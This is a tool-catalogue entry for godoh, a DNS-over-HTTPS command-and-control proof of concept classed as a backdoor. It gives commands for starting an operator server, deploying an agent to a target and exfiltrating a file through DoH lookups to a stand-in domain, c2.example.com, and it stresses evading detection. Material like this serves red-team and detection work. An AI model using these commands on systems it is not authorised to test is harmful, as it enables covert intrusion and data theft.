---
name: "godoh"
categories:
  - backdoor
version: "1.6+git20200517-0parrot1"
homepage: "https://github.com/sensepost/goDoH"
origin: "parrot"
recipe: "parrot-repo"
packaged-by: [parrot]
build-system: go
meta-checked: "2026-11-09"
github-repo: "sensepost/goDoH"
github-stars: 803
github-pushed: "2023-12-19"
github-archived: false
github-issues: 3
github-match: "exact"
gh-checked: "2026-11-07"
worth: 3.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# godoh

> DNS-over-HTTPS C2 proof of concept: an operator server, an implant agent, file transfer and channel tests, all tunneled through ordinary-looking DoH lookups at Google, Cloudflare or Quad9 (or plain DNS).

*No corpus evidence — derived from upstream documentation.*

## What it's for

Hiding C2 traffic inside HTTPS DNS resolution, so sessions look like a stub resolver talking to a public DoH provider. `godoh` (sensepost/goDoH) is a proof-of-concept framework: run the `c2` subcommand on your operator host, deploy the `agent` binary to a target, and commands flow as DNS A-record lookups against a domain you control. The provider is selectable per run with `-p` (`google`, `cloudflare`, `quad9`, `googlefront`, or `raw` for traditional DNS), DoH certificates can be validated with `-K`, and the communication key is generated at build time. Throughput is DNS-shaped — slow, one lookup per chunk — and it is a PoC, with no authentication beyond the shared build-time key.

## Typical use cases

### Verify the channel before deploying anything

```
godoh test -d c2.example.com -p cloudflare
```

Outcome: runs the DNS communications test through the chosen DoH provider and reports whether lookups for your domain resolve end to end — do this before starting the server or shipping an agent.

### Start the operator C2

```
godoh c2 -d c2.example.com
```

Outcome: the C2 server starts and waits for agent check-ins arriving as DoH lookups against your domain; sessions appear in the server console as agents register.

### Connect an agent on a target

```
godoh agent -d c2.example.com -p google
```

Outcome: the agent registers with your C2 through the provider's DoH endpoint and opens the command channel using DNS A-record lookups for your domain.

### Move a file over the same channel

```
godoh --domain c2.example.com send --file blueprints.docx
```

Outcome: the file is encoded, encrypted with the build-time key and transmitted as a stream of DNS A-record lookups; `godoh receive` on the other end reassembles it. Expect a large number of lookups for anything non-trivial.
